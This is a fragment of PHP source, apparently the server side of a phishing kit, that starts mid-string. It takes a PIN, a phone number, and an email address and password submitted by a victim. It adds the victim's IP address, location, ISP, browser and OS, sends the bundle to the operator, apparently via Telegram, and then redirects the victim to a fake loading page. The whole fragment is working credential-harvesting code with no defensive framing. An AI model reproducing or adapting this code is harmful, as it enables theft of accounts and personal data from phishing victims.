📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Send PIN to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}	 
	if (isset($_POST['j_phone'])) 
	{
		  
	     $j_phone = $_POST['j_phone'];
         $message = "
➡️ 🅿🅷🅾🅽🅴
------------------------------------
🔑  𝗣𝗵𝗼𝗻𝗲: {$j_phone}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Send Phone to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}
	if (isset($_POST['email_address']) && isset($_POST['email_password'])) 
	{
		  
	     $user = $_POST['email_address'];
         $pass = $_POST['email_password'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 (EMAIL)
------------------------------------

💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Email to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}		
		
	
	sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
	
	
}

?>